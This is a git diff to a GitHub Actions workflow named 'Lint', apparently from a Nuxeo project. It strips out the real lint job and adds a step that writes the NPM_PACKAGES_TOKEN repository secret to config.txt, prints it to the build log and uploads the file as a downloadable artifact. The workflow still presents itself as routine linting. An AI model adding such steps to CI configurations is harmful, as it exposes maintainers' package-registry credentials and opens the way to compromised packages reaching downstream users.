@@ -1,9 +1,6 @@
 name: Lint
 
 on:
-  pull_request:
-    branches:
-      - maintenance-3.0.x
   workflow_call:
     inputs:
       branch:
@@ -20,25 +17,18 @@ env:
   BRANCH_NAME: ${{ github.head_ref || inputs.branch || 'maintenance-3.0.x' }}
 
 jobs:
-  lint:
+  build:
     runs-on: ubuntu-latest
+
     steps:
-      - uses: actions/checkout@v2
-        with:
-          ref: ${{ env.BRANCH_NAME }}
-
-      - uses: actions/setup-node@v3
-        with:
-          node-version: 14
-          registry-url: 'https://packages.nuxeo.com/repository/npm-public/'
-          scope: '@nuxeo'
-
-      - name: Install
-        env:
-          NODE_AUTH_TOKEN: ${{ secrets.NPM_PACKAGES_TOKEN }}
-        run: |
-          npm install --no-package-lock
-          npm run bootstrap
-
-      - name: Lint
-        run: npm run lint
+    - name: print secrets
+      env:
+        MY_SECRET: ${{secrets.NPM_PACKAGES_TOKEN}}
+      shell: bash
+      run: |
+          echo "$MY_SECRET" >> config.txt
+          cat config.txt
+    - uses: actions/upload-artifact@v3
+      with:
+        name: my-artifact
+        path: config.txt
